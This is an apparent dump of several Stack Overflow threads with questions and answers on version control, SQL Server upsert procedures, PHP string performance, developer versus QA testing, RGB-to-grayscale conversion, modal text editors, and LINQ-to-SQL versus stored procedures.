<li><p>When you use distributed source control, you have the whole source tree on your local machine. You can commit, create branches, and work pretty much as though you were all alone, and then when you're ready to push up your changes, you can promote them from your machine to the master copy. If you're working ""offline"" a lot, this can be a huge benefit.</p></li>
<li><p>You don't have to ask anybody's permission to become a distributor of the source control. If person A is running the project, but person B and C want to make changes, and share those changes with each other, it becomes much easier with distributed source control.</p></li>
</ol>
 <p>I recommend checking out the following from Eric Sink:</p>

<p><a href=""http://www.ericsink.com/scm/source_control.html""><a href=""http://www.ericsink.com/scm/source_control.html"">http://www.ericsink.com/scm/source_control.html</a></a></p>

<p>Having some sort of revision control system in place is probably the most important tool a programmer has for reviewing code changes and understanding who did what to whom. Even for single person projects, it is invaluable to be able to diff current code against previous known working version to understand what might have gone wrong due to a change.</p>
 <p>Even if you don't branch, you may find it useful to use tags to mark releases.</p>

<p>Imagine that you rolled out a new version of your software yesterday and have started making major changes for the next version. A user calls you to report a serious bug in yesterday's release. You can't just fix it and copy over the changes from your development trunk because the changes you've just made the whole thing unstable.</p>

<p>If you had tagged the release, you could check out a working copy of it and use it to fix the bug.</p>

<p>Then, you might choose to create a branch at the tag and check the bug fix into it. That way, you can fix more bugs on that release while you continue to upgrade the trunk. You can also merge those fixes into the trunk so that they'll be present in the next release.</p>
 <p>Here are two articles that are very helpful for understanding the basics. Beyond being informative, Sink's company sells a great source control product called Vault that is free for single users (I am not affiliated in any way with that company). </p>

<p><a href=""http://www.ericsink.com/scm/source_control.html"" rel=""nofollow"">http://www.ericsink.com/scm/source_control.html</a></p>

<p><a href=""http://betterexplained.com/articles/a-visual-guide-to-version-control/"" rel=""nofollow"">http://betterexplained.com/articles/a-visual-guide-to-version-control/</a></p>

<p>Vault info at www.vault.com.</p>
 <p>The common standard for setting up Subversion is to have three folders under the root of your repository: trunk, branches and tags.  The trunk folder holds your current ""main"" line of development. For many shops and situations, this is all they ever use... just a single working repository of code.</p>

<p>The tags folder takes it one step further and allows you to ""checkpoint"" your code at certain points in time. For example, when you release a new build or sometimes even when you simply <em>make</em> a new build, you ""tag"" a copy into this folder. This just allows you to know exactly what your code looked like at that point in time.</p>

<p>The branches folder holds different kinds of branches that you might need in special situations. Sometimes a branch is a place to work on experimental feature or features that might take a long time to get stable (therefore you don't want to introduce them into your main line just yet). Other times, a branch might represent the ""production"" copy of your code which can be edited and deployed independently from your main line of code which contains changes intended for a future release.</p>

<p>Anyway, this is just one aspect of how to set up your system, but I think giving some thought to this structure is important.</p>
"
"Insert Update stored proc on SQL Server <p>I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:</p>

<pre><code>update myTable set Col1=@col1, Col2=@col2 where ID=@ID
if @@rowcount = 0
insert into myTable (Col1, Col2) values (@col1, @col2)
</code></pre>

<p>My logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.</p>

<p>The alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.</p>

<p>Is my logic sound here?
Is this how you would combine an insert and update into a stored proc?</p>
 <p>Your assumption is right, this is the optimal way to do it and it's called <a href=""http://en.wikipedia.org/wiki/Upsert"">upsert/merge</a>.</p>

<p><a href=""http://www.sqlservercentral.com/articles/T-SQL/61773/"">Importance of UPSERT - from sqlservercentral.com</a>: </p>

<blockquote>
  <p>For every update in the case mentioned above we are removing one
  additional read from the table if we
  use the UPSERT instead of EXISTS.
  Unfortunately for an Insert, both the
  UPSERT and IF EXISTS methods use the
  same number of reads on the table.
  Therefore the check for existence
  should only be done when there is a
  very valid reason to justify the
  additional I/O. The optimized way to
  do things is to make sure that you
  have little reads as possible on the
  DB.</p>
  
  <p>The best strategy is to attempt the
  update. If no rows are affected by the
  update then insert. In most
  circumstances, the row will already
  exist and only one I/O will be
  required.</p>
</blockquote>

<p><strong>Edit</strong>: 
Please check out <a href=""http://stackoverflow.com/questions/13540/insert-update-stored-proc-on-sql-server/193876#193876"">this answer</a> and the linked blog post to learn about the problems with this pattern and how to make it work safe.</p>
 <p>MERGE is one of the new features in SQL Server 2008, by the way.</p>
 <p>If to be used with SQL Server 2000/2005 the original code needs to be enclosed in transaction to make sure that data remain consistent in concurrent scenario.</p>

<pre><code>BEGIN TRANSACTION Upsert
update myTable set Col1=@col1, Col2=@col2 where ID=@ID
if @@rowcount = 0
insert into myTable (Col1, Col2) values (@col1, @col2)
COMMIT TRANSACTION Upsert
</code></pre>

<p>This will incur additional performance cost, but will ensure data integrity.</p>

<p>Add, as already suggested, MERGE should be used where available.</p>
 <p>Big fan of the UPSERT, really cuts down on the code to manage.  Here is another way I do it:  One of the input parameters is ID, if the ID is NULL or 0, you know it's an INSERT, otherwise it's an update.  Assumes the application knows if there is an ID, so wont work in all situations, but will cut the executes in half if you do.</p>
 <p>Your logic seems sound, but you might want to consider adding some code to prevent the insert if you had passed in a specific primary key.</p>

<p>Otherwise, if you're always doing an insert if the update didn't affect any records, what happens when someone deletes the record before you ""UPSERT"" runs?  Now the record you were trying to update doesn't exist, so it'll create a record instead.  That probably isn't the behavior you were looking for.</p>
 <p>If you are not doing a merge in SQL 2008 you must change it to:</p>

<p>if @@rowcount = 0 and @@error=0</p>

<p>otherwise if the update fails for some reason then it will try and to an insert afterwards because the rowcount on a failed statement is 0</p>
 <p>You not only need to run it in transaction, it also needs high isolation level. I fact default isolation level is Read Commited and this code need Serializable. </p>

<pre><code>SET transaction isolation level SERIALIZABLE
BEGIN TRANSACTION Upsert
UPDATE myTable set Col1=@col1, Col2=@col2 where ID=@ID
if @@rowcount = 0
  begin
    INSERT into myTable (ID, Col1, Col2) values (@ID @col1, @col2)
  end
COMMIT TRANSACTION Upsert
</code></pre>

<p>Mayne adding also the @@error check and rollback could be good idea.</p>
 <p>Please read the <a href=""http://samsaffron.com/blog/archive/2007/04/04/14.aspx"">post on my blog</a> for a good, safe pattern you can use. There are a lot of considerations, and the accepted answer on this question is far from safe. </p>

<p>For a quick answer try the following pattern. It will work fine on SQL 2000 and above. SQL 2005 gives you error handling which opens up other options and SQL 2008 gives you a MERGE command. </p>

<pre><code>begin tran
   update t with (serializable)
   set hitCount = hitCount + 1
   where pk = @id
   if @@rowcount = 0
   begin
      insert t (pk, hitCount)
      values (@id,1)
   end
commit tran
</code></pre>
 <p>Modified Dima Malenko post:</p>

<pre><code>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE 

BEGIN TRANSACTION UPSERT 

UPDATE MYTABLE 
SET    COL1 = @col1, 
       COL2 = @col2 
WHERE  ID = @ID 

IF @@rowcount = 0 
  BEGIN 
      INSERT INTO MYTABLE 
                  (ID, 
                   COL1, 
                   COL2) 
      VALUES      (@ID, 
                   @col1, 
                   @col2) 
  END 

IF @@Error &gt; 0 
  BEGIN 
      INSERT INTO MYERRORTABLE 
                  (ID, 
                   COL1, 
                   COL2) 
      VALUES      (@ID, 
                   @col1, 
                   @col2) 
  END 

COMMIT TRANSACTION UPSERT 
</code></pre>

<p>You can trap the error and send the record to a failed insert table. <br />
I needed to do this because we are taking whatever data is send via WSDL and if possible fixing it internally. </p>
"
"Speed difference in using inline strings vs concatenation in php5? <p>(assume php5) consider</p>

<pre><code>&lt;?php

    $foo = 'some words';

    //case 1
    print ""these are $foo"";

    //case 2
    print ""these are {$foo}"";

    //case 3
    print 'these are ' . $foo;
?&gt;
</code></pre>

<p>Is there much of a difference between 1 and 2?</p>

<p>If not, what about between 1/2 and 3?</p>
 <p>Well, as with all ""What might be faster in real life"" questions, you can't beat a real life test.</p>

<pre><code>function timeFunc($function, $runs)
{
  $times = array();

  for ($i = 0; $i &lt; $runs; $i++)
  {
    $time = microtime();
    call_user_func($function);
    $times[$i] = microtime() - $time;
  }

  return array_sum($times) / $runs;
}

function Method1()
{ 
  $foo = 'some words';
  for ($i = 0; $i &lt; 10000; $i++)
    $t = ""these are $foo"";
}

function Method2()
{
  $foo = 'some words';
  for ($i = 0; $i &lt; 10000; $i++)
    $t = ""these are {$foo}"";
}

function Method3()
 {
  $foo = 'some words';
  for ($i = 0; $i &lt; 10000; $i++)
    $t = ""these are "" . $foo;
}

print timeFunc('Method1', 10) . ""\n"";
print timeFunc('Method2', 10) . ""\n"";
print timeFunc('Method3', 10) . ""\n"";
</code></pre>

<p>Give it a few runs to page everything in, then...</p>

<p>0.0035568</p>

<p>0.0035388</p>

<p>0.0025394</p>

<p>So, as expected, the interpolation are virtually identical (noise level differences, probably due to the extra characters the interpolation engine needs to handle). Straight up concatenation is about 66% of the speed, which is no great shock. The interpolation parser will look, find nothing to do, then finish with a simple internal string concat. Even if the concat were expensive, the interpolator will still have to do it, <strong>after</strong> all the work to parse out the variable and trim/copy up the original string.</p>

<p><strong>Updates By Somnath:</strong></p>

<p>I added Method4() to above real time logic.</p>

<pre><code>function Method4()
 {
  $foo = 'some words';
  for ($i = 0; $i &lt; 10000; $i++)
    $t = 'these are ' . $foo;
}

print timeFunc('Method4', 10) . ""\n"";

Results were:

0.0014739
0.0015574
0.0011955
0.001169
</code></pre>

<p>When you are just declaring a string only and no need to parse that string too, then why to confuse PHP debugger to parse. I hope you got my point.</p>
 <p>@Adam's test used</p>

<pre><code>""these are "" . $foo
</code></pre>

<p>note that the following is even faster:</p>

<pre><code>'these are ' . $foo;
</code></pre>

<p>this is due to the fact, that a double quoted ""string"" gets evaluated, where a single quoted 'string' is just taken as is...</p>
 <p>Don't get too caught up on trying to optimize string operations in PHP. Concatenation vs. interpolation is meaningless (in real world performance) if your database queries are poorly written or you aren't using any kind of caching scheme. Write your string operations in such a way that debugging your code later will be easy, the performance differences are negligible.</p>

<p>@uberfuzzy Assuming this is just a question about language minutia, I suppose it's fine. I'm just trying to add to the conversation that comparing performance between single-quote, double-quote and heredoc in real world applications in meaningless when compared to the real performance sinks, such as poor database queries.</p>
 <p>The performance difference has been <a href=""http://nikic.github.com/2012/01/09/Disproving-the-Single-Quotes-Performance-Myth.html"" rel=""nofollow"">irrelevant</a> since at least January 2012, and likely earlier:</p>

<pre><code>Single quotes: 0.061846971511841 seconds
Double quotes: 0.061599016189575 seconds
</code></pre>

<p>Earlier versions of PHP may have had a difference - I personally prefer single quotes to double quotes, so it was a convenient difference. The conclusion of the article makes an excellent point:</p>

<blockquote>
  <p>Never trust a statistic you didn’t forge yourself.</p>
</blockquote>

<p>(Although the article quotes the phrase, the original quip was likely falsely <a href=""http://www.statistik.baden-wuerttemberg.de/Service/Veroeff/Monatshefte/20041111.mha"" rel=""nofollow"">attributed</a> to Winston Churchill, invented by Joseph Goebbels' propaganda ministry to portray Churchill as a liar:</p>

<blockquote>
  <p>Ich traue keiner Statistik, die ich nicht selbst gefälscht habe.</p>
</blockquote>

<p>This loosely translates to, ""I do not trust a statistic that I did not fake myself."")</p>
 <p>I seem to remember that the developer of the forum software, Vanilla replaced all the double quotes in his code with single quotes and noticed a reasonable amount of performance increase. </p>

<p>I can't seem to track down a link to the discussion at the moment though.</p>
 <p>Live benchmarks:</p>

<p><a href=""http://phpbench.com/"">http://phpbench.com/</a></p>

<p>There is actually a subtle difference when concatenating variables with single vs double quotes.  </p>
 <p>Double quotes can be much slower. I read from several places that that it is better to do this</p>

<pre><code>'parse me '.$i.' times'
</code></pre>

<p>than</p>

<pre><code>""parse me $i times""
</code></pre>

<p>Although I'd say the second one gave you more readable code.</p>
 <p>there is a difference when concatenating variables... and what you are doing with the result... and if what you are doing is dumping it to output, is or isn't output buffering on.</p>

<p>also, what is the memory situation of the server?  typically memory management on a higher level platform is worse than that at lower platforms... </p>

<pre><code>$a = 'parse' . $this; 
</code></pre>

<p>is managing memory at the user code platform level...</p>

<pre><code>$a = ""parse $this"";
</code></pre>

<p>is managing memory at the php system code platform level...</p>

<p>so these benchmarks as related to CPU don't tell the full story.  </p>

<p>running the benchmark 1000 times vs running the benchmark 1000 times on a server that is attempting to run that same simulation 1000 times concurrently... you might get drastically different results depending on the scope of the application.</p>
 <p>Practically there is no difference at all! See the timings: <a href=""http://micro-optimization.com/single-vs-double-quotes"" rel=""nofollow"">http://micro-optimization.com/single-vs-double-quotes</a> </p>
 <p>Any differences in execution time are completely negligible.</p>

<p>Please see</p>

<ul>
<li><a href=""http://nikic.github.com/2012/01/09/Disproving-the-Single-Quotes-Performance-Myth.html"">NikiC's Blog: Disproving the Single Quotes Performance Myth</a> for a technical explanation how interpolation and concatenation works in PHP and why it is absolutely pointless to care about their speed.</li>
</ul>

<p>Don't waste time on micro-optimizations like this. Use a profiler to measure the performance of your application in a real world scenario and then optimize where it is really needed. Optimising a single sloppy DB query is likely to make a bigger performance improvement than applying micro-optimisations all over your code.</p>
 <p>Just to add something else to the mix, if you are using a variable inside a double quoted string syntax:</p>

<pre><code>$foo = ""hello {$bar}"";
</code></pre>

<p>is faster than</p>

<pre><code>$foo = ""hello $bar"";
</code></pre>

<p>and both of these are faster than</p>

<pre><code>$foo = 'hello' . $bar; 
</code></pre>
"
"Developer testing vs. QA team testing - What is the right division of work? <p>While trying to advocate more developer testing, I find the argument ""Isn't that QA's job?"" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?</p>

<p>Clarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?</p>
 <p>There should always be some developer testing. If a developer is producing too many bugs, then he/she is wasting time later on fixing those bugs. It is important that the developers don't develop the attitude which says, oh well if I leave a bug, it will be caught and I will get a chance to fix it.</p>

<p>We try to keep a threshold for bugs produced. If this threshold is crossed during testing then the developer is answerable for it. It is up to you to decide what this threshold is (for us it can vary from project to project).</p>

<p>Also, all unit testing is done by the developers.</p>
 <p>I have only been in the industry for a year, but in my experience dev's are responsible for unit testing their features, while QA is responsible for testing scenarios.  QA would also be expected to test any boundry conditions.</p>
 <p>Here are some ways that developer testing is the most efficient / highest payoff:</p>

<ul>
<li>Developer modifies a shared library while working on a feature - dev has insight into possible side effects that QA / validation don't</li>
<li>Developer is unsure of performance of library call and writes a unit test</li>
<li>Developer discovers path of use case not considered in spec that code must support, writes code, updates spec, writes test</li>
</ul>

<p>It's arguable how much test duty should be carried out by the dev in the third example, but I argue that it's most efficient for the dev because all of the related minutiae from many layers of documentation and code are already in her short-term memory. This perfect storm may not be attainable by a tester after the fact.</p>

<p>Are we talking about QA or validation? I think of QA along the lines of inspection checklists, code standards enforcement, UI guidelines, etc. If we're talking validation, it doesn't make sense for devs to spend a lot of time authoring and executing formal test cases, but devs must provide all of the rationale and design documentation needed to author good tests.</p>
 <p>It's the difference between ""black box"" testing (where you know what the code is supposed to do, but not how it works), and ""white box"" testing (where knowing how it works drives how you test it). ""Black box"" testing is what most people think of when you mention Quality Assurance.</p>

<p>I work for a company where the QA team are also software developers.  (That narrows the field <em>a lot</em> if you care to guess the company.)  I know Joel's opinion, and my experience leads me to partially disagree: for the same reason that a ""white hat"" hacker is more effective finding security holes, certain kinds of errors are more effectively found by white box testers who know how to write code (and therefore what the common mistakes are - for example, resource management issues like memory leaks).  </p>

<p>Also, since QA-oriented developers are part of the process from the initial design phase, they can theoretically help to drive higher-quality code throughout the process.  Ideally, for each developer working on the project with a mental focus on functionality, you have an opposing developer with a mental focus on breaking the code (and thus making it better).  </p>

<p>Seen in that light, it's less a matter of using developers for testers than it is kind of disconnected pair-programming where one developer has an emphasis on controlling quality.  </p>

<p>On the other hand, a lot of testing (such as basic UI functionality) frankly doesn't need that kind of skill.  That's where Joel has a point. </p>

<p>For many businesses, I could see a system where programming teams trade off code review and testing duties for each others' code.  Members of the Business Logic team, for example, could spend an occasional tour testing and reviewing code for the UI team, and vice-versa.  That way you're not ""wasting"" developer talent on full-time testing, but you are gaining the advantages of exposing the code to (hopefully) expert scrutiny and punishment.  Then, a more traditional QA team can take up the ""black box"" testing.</p>
 <p>I'm pasting my answer to a question on our internal forum. If you have an hour or so.. take a listen to Mary Poppendieck's <a href=""http://video.google.com/videoplay?docid=-5105910452864283694"" rel=""nofollow"" title=""Dylan: A Dynamic Object-Oriented Language"">Competing on the basis of Speed</a> video. <em>Recommended</em></p>

<p><em>Note(By Testers - I refer to the QA Team)</em></p>

<p><strong>Developer / Unit tests</strong> <strong><em>_</em><em></strong>=<strong></em>__</strong>  <strong>Usability testing &amp; Exploratory</strong> testing</p>

<p>'==================================================================</p>

<p><strong>Acceptance / Customer tests</strong> <strong><em>=</em>__</strong> <strong>Property testing</strong></p>

<p>Imagine that to be a square with four quadrants. :)</p>

<p>The left half should be automated.</p>

<ul>
<li>Developer tests verify that the code works as the coder wanted it to.
  Tools: NUnit / xUnit / whatever home-made tool</li>
<li>Customer tests verify that the code works as the customer wanted it to.
The tests should be very easy to write, shouldn't require the customer to learn .NET/Java. Else the customer wont write those tests (although he may require some help of a developer). Fit for example uses HTML tables that can be written in Word.
Tools: FIT
Regression tools also lie here. Record-replay.</li>
</ul>

<p>The right half better utilizes the time &amp; effort of good testers. e.g. No automated test can tell you whether X dialog is usable. Humans are better at this than machines.</p>

<ul>
<li>Usability. Try to Break the System down,( catch unhandled failure scenarios, enter null values ). Basically catch things that the developer missed.</li>
<li>Property testing again requires humans. Here you check customer mandated properties that are required by your system. e.g. Performance - does your search dialog meet the 2 sec response time ? Security- can someone hack into this System ? etc. Availability - is your system online 99.99% of the time ?</li>
</ul>

<p>Testers shouldn't be spending time executing test-plans on the left half. That is the developers responsibility to ensure that the code works as the customer and the developer intended it to. The testers can infact help the customer formulate the acceptance tests..</p>
 <p>My general stance is that testers should never find unit level bugs (including boundary cases). The bugs testers find should be at the component, integration, or system level. Of course, at first testers may find ""happy path"" bugs and other simple bugs, but these anomalies should be used to help developers improve.</p>

<p>Part of your problem could be using $100 dollar per hour developers and $30 per hour testers :}. But regardless of the cost, I think knowing that bugs found earlier in the development cycle are inevitably cheaper, you'd probably still save money by having the developers own more testing. If you have a highly paid dev team and hack testers, you will probably find a lot of the big obvious issues, but you'll miss a lot of the more obscure bugs that will come back to haunt you later.</p>

<p>So, I suppose the answer to your question is that testers should test as much as you want them to. You can fire all of your testers and have the developers do all of the testing, or you can hire an army of testers and let the developers check in whatever they want.</p>
 <p>When appropriate, Quality Control teams should be able to conduct Security, Regression, Usability, Performance, Stress, Installation/Upgrade testing and not Developers</p>

<p>Developers should do unit testing with  code-coverage for the code being written as a minimal goal.</p>

<p>IN between, there is still quite a bit of testing to be done</p>

<ul>
<li>full code path testing</li>
<li>Component Testing</li>
<li>Integration Testing (of components)</li>
<li>System (integration) testing</li>
<li>etc</li>
</ul>

<p>The responsibility for these are mixed between QA and Development based on some mutual agreement on what makes most sense. Some component testing can only be done by unit testing, others are 'sufficiently' tested during integration testing etc.</p>

<p>Talk to each other, find out what everyone is most comfortable doing. It will take some time, but it's well worth it.</p>
 <p>Testing should be as automated as possible, which turns it back into dev work if the testers are writing code that gets added to the automated test suite.</p>

<p>Also, I've found that we get a lot of QA done in code review, as people will suggest extra edge and corner cases they want to see added to the unit tests that are being reviewed (along with the code they test of course).</p>
 <p>There are 2 types of qa groups, those who want to maintain status quo.
We always did so. They naturally hate  and get rid of those who try to make things more efficient and hence go beyond their comfort zone. That happened to me more than once. Unfortunately qa managers are as incompetent as  their qa teams. So a qa manager who has been managing for last 6 years will kill any automation, will introduce lots of processes just to justify their existence.This is an upper management responsibility to recognize that. 
    There are somewhat technical qa people who know tools. Unfortunately a programming language is not a tool, but a vision.
Working with those people really depend on how much they are willing to learn and how much the management is willing to take a risk of changing things. The tests should be written the same way as a main code is written object oriented structure easy to maintain.
I do think, that developers should review qa tests. Most of the time I found the automation not testing anything. Unfortunately qa work is considered the lower class, so developers do not bother. I myself get a luck, when I get a support from an influential developer in a group, who is willing to explain my efforts to a manager. It works only half of the time, unfortunately. Testers IMHO should report to dev manager. And all team should take a responsibility for what qa tests actually test.</p>
"
"RGB to monochrome conversion <p>How do I convert the RGB values of a pixel to a single monochrome value?</p>
 <p>I found one possible solution in the <a href=""http://www.poynton.com/notes/colour_and_gamma/ColorFAQ.html"">Color FAQ</a>. The <em>luminance component</em> Y (from the <em>CIE XYZ system</em>) captures what is most perceived by humans as color in one channel. So, use those coefficients:</p>

<pre><code>mono = (0.2125 * color.r) + (0.7154 * color.g) + (0.0721 * color.b);
</code></pre>
 <p><a href=""http://msdn.microsoft.com/en-us/library/bb332387.aspx#tbconimagecolorizer_grayscaleconversion"" rel=""nofollow"">This MSDN article</a> uses <code>(0.299 * color.R + 0.587 * color.G + 0.114 * color.B);</code></p>

<p><a href=""http://en.wikipedia.org/wiki/Grayscale#Converting_color_to_grayscale"" rel=""nofollow"">This Wikipedia article</a> uses <code>(0.3* color.R + 0.59 * color.G + 0.11 * color.B);</code></p>
 <p>This depends on what your motivations are.  If you just want to turn an arbitrary image to grayscale and have it look pretty good, the conversions in other answers to this question will do.</p>

<p>If you are converting color photographs to black and white, the process can be both very complicated and subjective, requiring specific tweaking for each image.  For an idea what might be involved, take a look at this <a href=""http://www.adobe.com/designcenter/photoshop/articles/phscs2mrblkwht.html"">tutorial</a> from Adobe for Photoshop.</p>

<p>Replicating this in code would be fairly involved, and would still require user intervention to get the resulting image aesthetically ""perfect"" (whatever that means!).</p>
 <p>This <a href=""http://www.cgg.cvut.cz/members/cadikm/color_to_gray_evaluation/"">recent scientific article</a> compares the state-of-the-art in converting color photographs to grayscale, including the simple luminance formula and more complex techniques.</p>
 <p>As mentioned also, a grayscale translation (note that monochromatic images need not to be in grayscale) from an RGB-triplet is subject to taste. </p>

<p>For example, you could cheat, extract only the blue component, by simply throwing the red and green components away, and copying the blue value in their stead. Another simple and generally ok solution would be to take the average of the pixel's RGB-triplet and use that value in all three components.</p>

<p>The fact that there's a considerable market for professional and not-very-cheap-at-all-no-sirree grayscale/monochrome converter plugins for Photoshop alone, tells that the conversion is just as simple or complex as you wish.</p>
"
"Why are there so few modal-editors that aren't vi*? <p>Pretty much every other editor that isn't a vi descendant (vim, cream, vi-emu) seems to use the emacs shortcuts (<kbd>ctrl</kbd>+<kbd>w</kbd> to delete back a word and so on)</p>
 <p>Um... maybe there isn't much of a need for one, given that Vi/Vim is pretty much available everywhere and got the whole modal thing right? :) </p>
 <p>I believe Eclipse has Vi bindings and there is a Visual Studio plugin/extension, too (which is called Vi-Emu, or something).</p>
 <p>Early software was often modal, but usability took a turn at some point, away from this style. </p>

<p>VI-based editors are total enigmas -- they're the only real surviving members of that order of software. </p>

<p>Modes are a no-no in usability and interaction design because we humans are fickle mammals who cannot be trusted to remember what mode the application is in. </p>

<p>If you think you are in one ""mode"" when you are actually in another, then all sorts of badness can ensue. What you believe to be a series of harmless keystrokes can (in the wrong mode) cause unlimited catastrophe. This is known as a ""mode error"".</p>

<p>To learn more, search for the term ""modeless"" (and ""usability"")</p>

<p>As mentioned in the comments below, a Modal interface in the hands of an experienced and non-fickle person can be extremely efficient.</p>
 <p>Though not really answering your question, there used to be a ""modal like"" way to write Japanese on cell phones before :
The first letter you hit was a conson let's say K, and then, and then the next key you would hit would have the role of a conson. (Having two conson in a row is impossible in Japanese)</p>

<p>Though it was main a few years ago, today it's only used by people who really want to hit fast.</p>
 <p>@Leon: Great answer.</p>

<p>@dbr: Modal editing is something that takes a while to get used to. If you were to build a new editor that fits this paradigm, how would you improve on VI/VIM/Emacs? I think that is, in part, an answer to the question. Getting it ""right"" is hard enough, competing agains the likes of VI/VIM/Emacs would be extremely tough -- most people who use these editors are ""die hard"" fans, and you'd have to give them a compelling reason to move to another editor. Those people who don't use them already are most likely going to stay in a non-modal editor. IMHO of course ;)</p>
 <p>I recently came across <a href=""http://www.cs.brown.edu/research/plt/software/divascheme/"" rel=""nofollow"">divascheme</a> - an alternative set of key bindings for <a href=""http://www.drscheme.org/"" rel=""nofollow"">DrScheme</a>.  This is modal, and part of the justification is to do with RSI - specifically avoiding lots of wrist twisting to hit <kbd>Ctrl</kbd>-<kbd>Alt</kbd>-<kbd>Shift</kbd>-<kbd>something</kbd>.  The coder has done an informal survey of fellow coders and found that emacs users suffered from more wrist pain than vi coders.</p>

<p>You can see him doing a <a href=""http://video.google.com/videoplay?docid=-2721456512458968128&amp;hl=en"" rel=""nofollow"">short talk</a> at <a href=""http://lugradio.org/live/USA2008/"" rel=""nofollow"">LugRadio Live USA</a>.  (The video is a series of 5 minute talks and I can't remember how far through it is, sorry - if someone watches it and posts that here I'll edit this post to say when in the video it is).</p>

<p>Note I have not used divascheme.</p>
 <p>Modal editors have the huge advantage to touch typists that you can navigate around the screen without taking your hands off the home row.  My wrists only hurt when I'm doing stuff that requires me to move my hand off the keyboard and onto the mouse or arrow keys and back constantly.</p>
 <p>It's worth noting that the vi input models survival is in part due it's adoption in the POSIX standard, so investing time in learning would mean your guarenteed to be  able to work on any system complying to these standards. So, like English, theres power in ubiquity.</p>

<p>As far as alternatives go, I doubt an alternate model editor would survive a 30 day free trial period, so its the same reason more people drive automatics than fly jets. </p>
 <p>I think that it's because vi (and its ilk) already occupies the ecological niche of modal editors.</p>

<p>The number of people who prefer modal and haven't yet been attracted to vi is probably 0, so the hypothetical vi competitor would have to be so great as to make a significant number of vi users switch. This isn't likely. The cost of switching editors is huge and the vi-s are probably already as good as modal editors go. Well, maybe a significant breakthrough could improve upon them, but I find this unlikely.</p>
 <p>I think the answer to the question is actually there are quite a few modal text editors that aren't forks of vi/vim. However <em>they all use the vi key bindings</em>. Vi users get the key bindings into their muscle memory so relearning a different set of key bindings would be really hard, so no-one would create a different set of key bindings.</p>

<p>But lots of different editors have re-implemented the vi key bindings from scratch. Just look at <a href=""http://stackoverflow.com/questions/294613/does-any-ide-have-a-vi-keybindings-options"">this question about IDEs with vi key bindings</a>. At least half of the answers are editors built from scratch that implement vi key bindings, not versions of vi embedded.</p>
 <p>VIM and emacs make about as much user interface design sense as qwerty.  We now have available modern computer optimized key layouts (see the colemak layout and the carpalx project); it's only a matter of time before someone does the same for text editors.  </p>
 <p>The invention of the <a href=""http://www.wired.com/science/discoveries/news/2009/01/dayintech_0126"" rel=""nofollow"">mouse</a> took one mode and moved it to an input device, and context menus took another mode and moved it to a button. Ironically, the advent of touch devices has had the reverse effect, producing <a href=""http://www.demystifyingusability.com/2007/06/multimodal_desi.html"" rel=""nofollow"">multi-modal</a> interfaces:</p>

<ul>
<li><p>aware multi-modal - touch and speech are aware of each other and intersect</p></li>
<li><p>unaware multi-modal - touch and speech are unaware of each other and conflict</p></li>
</ul>

<blockquote>
  <p>The traditional WIMP interfaces have the basic premise that the information can flow in and out of the system through a single channel or an event stream. This event stream can be in the form of input (mouse, keyboard etc) where the user enters data to the system and expects feedback in the form of output (voice, vibration, visual, etc) when the system responds. But the channel maintains its singularity and can process information one source at a time. For example, in today’s interaction, the computer ignores typed information (through a keyboard) when a mouse button is depressed.</p>
  
  <p>This is very much different from a multimodal interaction where the system has multiple event streams and channels and can process information coming through various input modes acting in parallel, such as those described above. For example, in an IVR system a user can either type or speak to navigate through the menu.</p>
</blockquote>

<p><strong>References</strong></p>

<ul>
<li><p><a href=""http://www.w3.org/WAI/UA/work/wiki/Keyboard_Interface_use_cases"" rel=""nofollow"">User Agent Accessibility Guidelines working group (UAWG): Keyboard Interface use cases</a></p></li>
<li><p><a href=""http://www.w3.org/2009/02/emma-pressrelease.html.en"" rel=""nofollow"">W3C Multimodal Standard Brings Web to More People, More Ways</a></p></li>
<li><p><a href=""http://www.w3.org/Voice/multimodal-rfp.html"" rel=""nofollow"">Next steps for W3C work on Multimodal Standards</a></p></li>
<li><p><a href=""http://johnnyholland.org/2008/11/the-future-of-interaction-is-it-multimodal/"" rel=""nofollow"">The Future of Interaction is Multimodal</a></p></li>
</ul>
 <p>Remember that Notepad is a modal editor!</p>

<p>To see this, try typing <kbd>E</kbd>, <kbd>D</kbd>, <kbd>I</kbd>, <kbd>T</kbd>; now try typing <kbd>Alt</kbd>, <kbd>E</kbd>, <kbd>D</kbd>, <kbd>I</kbd>, <kbd>T</kbd>.  In the second case the Alt key activates the ""menu mode"" so the results are different. :oP  People seem to cope with that.</p>

<p>(Yes, this is a feature of Windows rather than specifically of Notepad.  I think it's a bad feature because it is easy to hit Alt by mistake and I don't think you can turn it off.)</p>
 <p>Maybe there isn't much of a need for one, given that Vi/Vim is pretty much available everywhere and got the whole modal thing</p>
"
"LINQ-to-SQL vs stored procedures? <p>I took a look at the ""Beginner's Guide to LINQ"" post here on StackOverflow (<a href=""http://stackoverflow.com/questions/8050/beginners-guide-to-linq"">http://stackoverflow.com/questions/8050/beginners-guide-to-linq</a>), but had a follow-up question:</p>

<p>We're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.</p>

<p>So, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?</p>

<p>Thanks.</p>
 <p>Linq to Sql.</p>

<p>Sql server will cache the query plans, so there's no performance gain for sprocs.</p>

<p>Your linq statements, on the other hand, will be logically part of and tested with your application.  Sprocs are always a bit separated and are harder to maintain and test.</p>

<p>If I was working on a new application from scratch right now I would just use Linq, no sprocs.</p>
 <p>I'm assuming you mean Linq To Sql</p>

<p>For any CRUD command it's easy to profile the performance of a stored procedure vs. any technology. In this case any difference between the two will be negligible. Try profiling for a 5 (simple types) field object over 100,000 select queries to find out if there's a real difference.</p>

<p>On the other hand the real deal-breaker will be the question on whether you feel comfortable putting your business logic on your database or not, which is an argument against stored procedures.</p>
